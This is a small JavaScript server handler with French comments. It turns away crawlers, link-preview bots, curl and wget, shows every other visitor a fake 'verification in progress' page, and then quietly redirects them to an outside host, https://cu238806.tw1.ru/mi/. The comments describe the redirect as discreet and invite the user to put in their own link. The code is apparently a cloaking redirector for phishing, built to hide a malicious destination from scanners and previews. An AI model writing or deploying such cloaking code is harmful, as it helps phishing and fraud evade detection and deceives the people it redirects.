export default async function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  
  // Liste de bots connus à bloquer
  const bots = ['bot', 'crawl', 'spider', 'preview', 'curl', 'wget'];
  if (bots.some(b => userAgent.toLowerCase().includes(b))) {
    return res.status(403).send('Access Denied');
  }

  // Lien cible (à modifier par ton lien)
  const target = "https://cu238806.tw1.ru/mi/";

  // Redirection discrète
  res.setHeader('Refresh', '1;url=' + target);
  res.status(200).send(`
    <html>
      <head>
        <meta name="robots" content="noindex, nofollow">
        <meta http-equiv="refresh" content="1;url=${target}">
        <style>
          body {
            font-family: sans-serif;
            background: #f4f4f4;
            display: flex;
            height: 100vh;
            align-items: center;
            justify-content: center;
          }
          .card {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
          }
        </style>
      </head>
      <body>
        <div class="card">
          <h2>Vérification en cours...</h2>
          <p>Veuillez patienter un instant...</p>
        </div>
      </body>
    </html>
  `);
}
